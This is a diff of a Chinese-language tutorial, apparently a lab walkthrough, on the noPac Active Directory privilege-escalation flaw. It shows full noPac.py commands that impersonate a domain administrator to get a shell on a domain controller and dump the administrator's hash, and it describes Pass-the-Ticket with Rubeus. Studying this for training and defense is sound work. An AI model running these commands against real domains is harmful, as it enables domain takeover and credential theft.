@@ -78,13 +78,13 @@ noPac利用工具
 的值设置为**0**  
 。攻击就会失败，用户将没有权限添加新的计算机账户。  
 ### 漏洞利用  
-> sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap  
+> sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap  
   
   
 ![1744871640_6800a0d8d2f9ed67b3a22.png!small?1744871641616](https://mmbiz.qpic.cn/mmbiz_jpg/5975bXHXfWElmicQfyttQ4ULfUdkaNe9BmHx6YicPPL54ibhj5Uib5W3Jib0Mk2Uxwpo2GxehjzGkb3sXPn9afJCicvA/640?wx_fmt=jpeg&from=appmsg "")  
 ### Dump hash  
   
-sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator  
+sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator  
   
 ![1744871883_6800a1cbe4948736766b2.png!small?1744871884503](https://mmbiz.qpic.cn/mmbiz_jpg/5975bXHXfWElmicQfyttQ4ULfUdkaNe9BNHxSbRL3WRs82ODPmHHUMLsSUsSzrzab79Dmtzffm5IUicB40mQuFqA/640?wx_fmt=jpeg&from=appmsg "")  
   
@@ -170,7 +170,7 @@ TGT票据保存到了本地dc01.ccache 文件中。
 ![1744810419_67ffb1b32faa0118c3de7.png!small?1744810420059](https://mmbiz.qpic.cn/mmbiz_jpg/5975bXHXfWElmicQfyttQ4ULfUdkaNe9BicO1kgyPk0KsUV8ouG3fWQf0sFxLicovH3RBeu3IiaWrR8bvibhT3fuEFQ/640?wx_fmt=jpeg&from=appmsg "")  
   
 一样可以导出目标NTLM哈希  
-### 方法三Pass-the-Ticket (PTT)   
+### 方法三Pass-the-Ticket (PTT)   
   
 当我们通过ntlmrelayx.py获取到base64编码的证书，我们可以在Windows的主机上使用该证书，利用Rubeus 工具来请求TGT票据，执行**Pass-the-Ticket (PTT)**  
 攻击。  
